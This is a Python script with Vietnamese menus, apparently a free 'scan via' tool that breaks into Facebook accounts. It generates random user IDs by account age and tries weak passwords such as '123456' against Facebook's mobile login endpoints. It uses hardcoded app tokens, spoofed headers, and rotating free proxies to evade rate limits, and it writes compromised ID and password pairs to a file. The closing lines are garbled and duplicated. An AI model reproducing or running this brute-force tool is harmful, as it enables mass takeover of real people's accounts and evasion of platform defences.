#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Tool scan via Facebook – Tối ưu tốc độ, tự động lấy proxy, đổi proxy mỗi 20 UID
import os, sys, time, uuid, random, requests, threading, queue, json
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

R       = '\x1b[38;5;196m'
GREEN   = '\x1b[38;5;46m'
WHITE   = '\x1b[1;37m'
RESET   = '\x1b[0m'
BOLD    = '\x1b[1m'
B1      = '\x1b[38;5;21m'
B2      = '\x1b[38;5;27m'
B3      = '\x1b[38;5;33m'
B4      = '\x1b[38;5;39m'
P1      = '\x1b[38;5;93m'
P2      = '\x1b[38;5;129m'
P3      = '\x1b[38;5;165m'
P4      = '\x1b[38;5;177m'

TIMEOUT     = 3  # Giảm nữa để tăng tốc
OUTPUT_FILE = '/sdcard/ht_tool_result.txt'

PROXY_QUEUE = queue.Queue()
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000&country=all&ssl=all&anonymity=elite",
    "https://www.proxy-list.download/api/v1/get?type=https",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
]
PROXY_REFRESH_INTERVAL = 60  # Refresh mỗi 60s để đảm bảo pool luôn tươi
ROTATE_AFTER = 20  # Đổi proxy sau mỗi 20 UID

WEAK_PASSWORDS = [
    '123456','123456789','12345678','1234567','1234567890',
    '',
]

UA_LIST = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Build/UQ1A.240205.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.164 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/450.0.0.44.109;]",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.33.102;]",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.22.100;]",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:110.0) Gecko/20100101 Firefox/110.0",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.0.99;]",
]

TOKENS = [
    "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    "6628568379|c1e620fa708a1d5696fb990c466eaa64",
    "124024574287414|bcb6d3a1d2e5e5e5e5e5e5e5e5e5e5",
]

found_accounts = 0
total_scanned  = 0
checkpoint_hit = 0
scan_lock      = threading.Lock()
print_lock     = threading.Lock()
proxy_lock     = threading.Lock()
start_time     = None
stop_ticker    = False
request_count  = 0  # Tổng số UID đã thử (để tính đổi proxy)
proxy_errors   = 0   # Đếm lỗi proxy liên tiếp để buộc refresh

_local = threading.local()

# ========== PROXY MANAGER ==========
def fetch_proxies_from_source(url):
    try:
        r = requests.get(url, timeout=4)
        proxies = []
        for line in r.text.strip().splitlines():
            line = line.strip()
            if line and ':' in line and not line.startswith('#'):
                proxies.append(line)
        return proxies
    except:
        return []

def refresh_proxy_pool():
    global PROXY_QUEUE, proxy_errors
    new_proxies = set()
    for src in PROXY_SOURCES:
        new_proxies.update(fetch_proxies_from_source(src))
    with proxy_lock:
        while not PROXY_QUEUE.empty():
            PROXY_QUEUE.get()
        for p in new_proxies:
            PROXY_QUEUE.put(p)
        if PROXY_QUEUE.empty():
            PROXY_QUEUE.put(None)
    proxy_errors = 0

def get_proxy_from_pool():
    global PROXY_QUEUE
    try:
        with proxy_lock:
            if not PROXY_QUEUE.empty():
                proxy = PROXY_QUEUE.get()
                if proxy is None:
                    PROXY_QUEUE.put(None)
                    return None
                PROXY_QUEUE.put(proxy)
                return proxy
            else:
                return None
    except:
        return None

def rotate_proxy():
    """Đổi proxy cho session hiện tại (nếu có)"""
    sess = getattr(_local, 'session', None)
    if sess:
        proxy_str = get_proxy_from_pool()
        if proxy_str and proxy_str.lower() != 'none':
            sess.proxies = {'http': f'http://{proxy_str}', 'https': f'http://{proxy_str}'}
        else:
            sess.proxies = None

def proxy_refresh_daemon():
    while not stop_ticker:
        refresh_proxy_pool()
        time.sleep(PROXY_REFRESH_INTERVAL)
# ===================================

def get_session():
    if not hasattr(_local, 'session'):
        s = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=1,
            pool_maxsize=1,
            max_retries=0
        )
        s.mount('https://', adapter)
        s.mount('http://',  adapter)
        _local.session = s
        rotate_proxy()
    return _local.session

def cls():
    os.system('clear' if os.name != 'nt' else 'cls')

def sep(title=''):
    if title:
        s = (46 - len(title) - 2) // 2
        print(f"  {B2}{'─'*s}{RESET} {P3}{title}{RESET} {B2}{'─'*s}{RESET}")
    else:
        print(f"  {B2}{'─'*48}{RESET}")

def prompt(text):
    return input(f"  {B2}[{B4}?{B2}]{RESET} {WHITE}{text}:{RESET} ").strip()

def info(text):  print(f"  {B3}[{B4}+{B3}]{RESET} {WHITE}{text}{RESET}")
def err(text):   print(f"  {R}[!]{RESET} {WHITE}{text}{RESET}")
def ok(text):    print(f"  {P2}[{GREEN}✔{P2}]{RESET} {WHITE}{text}{RESET}")

def guess_year(uid):
    uid = str(uid)
    if uid.startswith('100000'): return random.choice(['2009','2010'])
    if uid.startswith('100001'): return '2010'
    if uid.startswith(('100002','100003')): return '2011'
    if uid.startswith('100004'): return '2012'
    if uid.startswith(('100005','100006')): return '2013'
    if uid.startswith(('100007','100008')): return '2014'
    if uid.startswith('100009'): return '2015'
    if uid.startswith('6155'):   return '2020+'
    try:
        n = int(uid)
        if n < 1000000:   return "2004-2005"
        if n < 50000000:  return "2006-2007"
        return "2008-2009"
    except:
        return 'Unknown'

def generate_uid(series=None):
    if series == '2009-2010': return '10000'  + ''.join(random.choices('0123456789', k=10))
    if series == '2011-2012': return '10000'  + random.choice(['2','3','4']) + ''.join(random.choices('0123456789', k=8))
    if series == '2013-2014': return '10000'  + random.choice(['5','6','7','8']) + ''.join(random.choices('0123456789', k=8))
    if series == '2015':      return '100009' + ''.join(random.choices('0123456789', k=8))
    if series == 'old':       return str(random.randint(1000, 999999999))
    return '10000' + random.choice('123456789') + ''.join(random.choices('0123456789', k=8))

def get_headers():
    return {
        'User-Agent': random.choice(UA_LIST),
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8',
        'X-FB-Connection-Type': 'WIFI',
        'X-FB-Net-HNI': str(random.randint(40000, 50000)),
        'X-FB-SIM-HNI': str(random.randint(40000, 50000)),
        'X-FB-Connection-Quality': 'EXCELLENT',
        'X-FB-HTTP-Engine': 'Liger',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

def try_login(uid, pwd, token, method='v1'):
    sess = get_session()
    try:
        if method == 'v1':
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json',
                'device_id': str(uuid.uuid4()), 'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': uid, 'password': pwd,
                'access_token': token, 'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US', 'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            r = sess.post(
                'https://b-graph.facebook.com/auth/login',
                data=data, headers=get_headers(),
                timeout=TIMEOUT, verify=False
            )
        else:
            url = (
                f"https://b-api.facebook.com/method/auth.login"
                f"?format=json&email={uid}&password={pwd}"
                f"&credentials_type=device_based_login_password"
                f"&generate_session_cookies=1&error_detail_type=button_with_disabled"
                f"&source=device_based_login&meta_inf_fbmeta=%20&locale=en_US"
                f"&client_country_code=US&access_token={token}"
                f"&fb_api_req_friendly_name=authenticate&cpl=true"
            )
            r = sess.get(url, headers=get_headers(), timeout=TIMEOUT, verify=False)
        return r.json()
    except Exception:
        global proxy_errors
        proxy_errors += 1
        if proxy_errors >= 50:
            refresh_proxy_pool()
        return {}

def worker(uid, method='v1'):
    global total_scanned, found_accounts, checkpoint_hit, request_count
    token = random.choice(TOKENS)
    hit = False

    for idx, pwd in enumerate(WEAK_PASSWORDS):
        resp = try_login(uid, pwd, token, method)
        rs   = str(resp)

        if 'session_key' in resp or ('access_token' in resp and 'error' not in resp):
            year = guess_year(uid)
            with scan_lock:
                found_accounts += 1
            with print_lock:
                sys.stdout.write('\r' + ' ' * 80 + '\r')
                sys.stdout.flush()
                print(f"\n  {B2}╔{'═'*46}╗{RESET}")
                print(f"  {B2}║{RESET}  {GREEN}{BOLD}✔  SCAN THANH CONG!{RESET}                          {B2}║{RESET}")
                print(f"  {B2}╠{'═'*46}╣{RESET}")
                uid_disp = uid[:38]
                pwd_disp = pwd[:38]
                print(f"  {B2}║{RESET}  {P3}UID  :{RESET} {WHITE}{uid_disp}{RESET}{' '*(39-len(uid_disp))}{B2}║{RESET}")
                print(f"  {B2}║{RESET}  {P3}PASS :{RESET} {WHITE}{pwd_disp}{RESET}{' '*(39-len(pwd_disp))}{B2}║{RESET}")
                print(f"  {B2}║{RESET}  {P3}YEAR :{RESET} {B4}{year}{RESET}{' '*(39-len(year))}{B2}║{RESET}")
                print(f"  {B2}╚{'═'*46}╝{RESET}\n")
            with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{uid}|{pwd}|{year}\n")
            hit = True
            break

        elif 'www.facebook.com' in rs or 'checkpoint' in rs.lower():
            year = guess_year(uid)
            with scan_lock:
                checkpoint_hit += 1
            with print_lock:
                sys.stdout.write('\r' + ' ' * 80 + '\r')
                sys.stdout.flush()
                print(f"  {P2}[CP]{RESET} {B4}{uid}{RESET} {P1}|{RESET} {WHITE}{pwd}{RESET} {P1}|{RESET} {B3}{year}{RESET}")
            with open(OUTPUT_FILE.replace('.txt', '_CP.txt'), 'a', encoding='utf-8') as f:
                f.write(f"{uid}|{pwd}|{year}\n")
            break

    with scan_lock:
        total_scanned += 1
        request_count += 1
        if request_count % ROTATE_AFTER == 0:
            rotate_proxy()

    return hit

def ticker_thread():
    spin = ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏']
    i = 0
    while not stop_ticker:
        elapsed = time.time() - start_time if start_time else 0.001
        speed   = total_scanned / elapsed if elapsed > 0 else 0
        done    = min(int(speed / 5), 20)
        bar     = f"{GREEN}{'█'*done}{RESET}{B1}{'░'*(20-done)}{RESET}"
        with print_lock:
            sys.stdout.write(
                f"\r  {B3}{spin[i % len(spin)]}{RESET} {bar}"
                f"  {B4}{total_scanned}{RESET} scanned"
                f"  {P2}|{RESET}  {GREEN}{BOLD}{found_accounts}{RESET} hit"
                f"  {P2}|{RESET}  {P3}{checkpoint_hit}{RESET} cp"
                f"  {P2}|{RESET}  {B3}{speed:.1f}/s{RESET}   "
            )
            sys.stdout.flush()
        i += 1
        time.sleep(0.1)

def loading_animation():
    symbols = ['|', '/', '-', '\\']
    print()
    for i in range(20):
        print(f"\r  {B3}[{RESET} {B4}Đang khởi tạo tool... {P3}{symbols[i%4]}{RESET} {B3}]{RESET}", end='')
        time.sleep(0.1)
    print("\r" + ' '*50 + "\r", end='')

def banner():
    cls()
    loading_animation()
    cls()
    print()
    print(f"  {B1}╔{'═'*48}╗{RESET}")
    print(f"  {B1}║{RESET}{' '*48}{B1}║{RESET}")
    print(f"  {B1}║{RESET}   {B2}██╗  ██╗{RESET} {P2}████████╗{RESET}  {WHITE}S C A N   V I A{RESET}     {B1}║{RESET}")
    print(f"  {B1}║{RESET}   {B3}██║  ██║{RESET} {P3}╚══██╔══╝{RESET}                     {B1}║{RESET}")
    print(f"  {B1}║{RESET}   {B3}███████║{RESET} {P3}   ██║   {RESET}  {B4}F A C E B O O K{RESET}     {B1}║{RESET}")
    print(f"  {B1}║{RESET}   {B4}██╔══██║{RESET} {P3}   ██║   {RESET}                     {B1}║{RESET}")
    print(f"  {B1}║{RESET}   {B4}██║  ██║{RESET} {P4}   ██║   {RESET}  {P2}Tool free no sell{RESET}  {B1}║{RESET}")
    print(f"  {B1}║{RESET}   {B1}╚═╝  ╚═╝{RESET} {P1}   ╚═╝   {RESET}                     {B1}║{RESET}")
    print(f"  {B1}║{RESET}{' '*48}{B1}║{RESET}")
    print(f"  {P1}╠{'═'*48}╣{RESET}")
    print(f"  {P1}║{RESET}  {P3}◈{RESET} {WHITE}Admin  :{RESET} {B4}Thiện Gay{RESET}{' '*32}{P1}║{RESET}")
    print(f"  {P1}║{RESET}  {P3}◈{RESET} {WHITE}Version:{RESET} {B3}1.2{RESET}{' '*36}{P1}║{RESET}")
    print(f"  {P1}╚{'═'*48}╝{RESET}")
    print()

def main_menu():
    global start_time, total_scanned, found_accounts, checkpoint_hit, stop_ticker, request_count

    banner()
    sep('CHON CHUC NANG')
    print(f"  {B2}[{B4}1{B2}]{RESET}  {P3}»{RESET} Scan {WHITE}2009-2010{RESET}")
    print(f"  {B2}[{B4}2{B2}]{RESET}  {P3}»{RESET} Scan {WHITE}2011-2012{RESET}")
    print(f"  {B2}[{B4}3{B2}]{RESET}  {P3}»{RESET} Scan {WHITE}2013-2014{RESET}")
    print(f"  {B2}[{B4}4{B2}]{RESET}  {P3}»{RESET} Scan {WHITE}2015{RESET}")
    print(f"  {B2}[{B4}5{B2}]{RESET}  {P3}»{RESET} Scan {WHITE}ID Sieu Co (2004-2009){RESET}")
    print(f"  {B2}[{B4}6{B2}]{RESET}  {P3}»{RESET} Scan {WHITE}Random All{RESET}")
    print(f"  {B2}[{R}0{B2}]{RESET}  {R}»{RESET} {R}Thoat{RESET}")
    sep()

    choice = prompt('Chon chuc nang')

    series_map = {
        '1': '2009-2010', '2': '2011-2012',
        '3': '2013-2014', '4': '2015',
        '5': 'old',       '6': 'all',
    }

    if choice in series_map:
        print()
        sep('CAU HINH')
        try:
            total   = int(prompt('So luong UID can scan'))
            threads = int(prompt('So luong luong [Enter = 150]') or 150)
            method  = prompt('Method v1/v2 [Enter = v1]').lower() or 'v1'
        except ValueError:
            err('Gia tri khong hop le!')
            time.sleep(1)
            main_menu()
            return

        total_scanned = found_accounts = checkpoint_hit = 0
        request_count = 0
        stop_ticker   = False
        start_time    = time.time()

        info("Dang lay proxy mien phi...")
        refresh_proxy_pool()
        proxy_count = PROXY_QUEUE.qsize()
        if proxy_count == 0 or (proxy_count == 1 and PROXY_QUEUE.queue[0] is None):
            err("Khong lay duoc proxy, se chay khong proxy.")
        else:
            ok(f"Lay duoc {proxy_count} proxy.")

        proxy_daemon = threading.Thread(target=proxy_refresh_daemon, daemon=True)
        proxy_daemon.start()

        uid_list = [generate_uid(series_map[choice]) for _ in range(total)]

        print()
        sep('DANG SCAN')
        info(f'Tao {B4}{total}{RESET}{WHITE} UID  |  Luong: {B4}{threads}{RESET}{WHITE}  |  Method: {P3}{method.upper()}')
        info(f'Proxy: {GREEN}ON (rotate/{ROTATE_AFTER}){RESET}{WHITE}  |  Timeout: {B4}{TIMEOUT}s{RESET}  |  Passwords: {B4}{len(WEAK_PASSWORDS)}')
        print()

        ticker = threading.Thread(target=ticker_thread, daemon=True)
        ticker.start()

        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(worker, uid, method): uid for uid in uid_list}
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception:
                    pass

        stop_ticker = True
        ticker.join(timeout=1)

        elapsed = time.time() - start_time
        print(f"\n")
        sep('KET QUA SCAN')
        ok(f'Tong UID scan  : {B4}{total_scanned}')
        ok(f'Tim duoc       : {GREEN}{BOLD}{found_accounts}{RESET}')
        ok(f'Checkpoint     : {P3}{checkpoint_hit}')
        ok(f'Thoi gian      : {B3}{elapsed:.1f}s')
        ok(f'Toc do trung binh : {B4}{total_scanned/max(elapsed,0.1):.1f} UID/s')
        ok(f'File luu       : {B3}{OUTPUT_FILE}')
        sep()
        prompt('Nhan Enter de tiep tuc')
        main_menu()

    elif choice == '0':
        sep()
        ok('Cam on da su dung Ht Tool!')
        sep()
        sys.exit(0)
    else:
        err('Lua chon khong hop le!')
        time.sleep(1)
        main_menu()

if __name__ == '__main__':
    out_dir = os.path.dirname(OUTPUT_FILE)
    if out_dir and not os.path.exists(out_dir):
        os.makedirs(out_dir, exist_ok=True)
    main_menu())   out_dir = os.path.dirname(OUTPUT_FILE)
    if out_dir and not os.path.exists(out_dir):
        os.makedirs(out_dir, exist_ok=True)
    main_menu())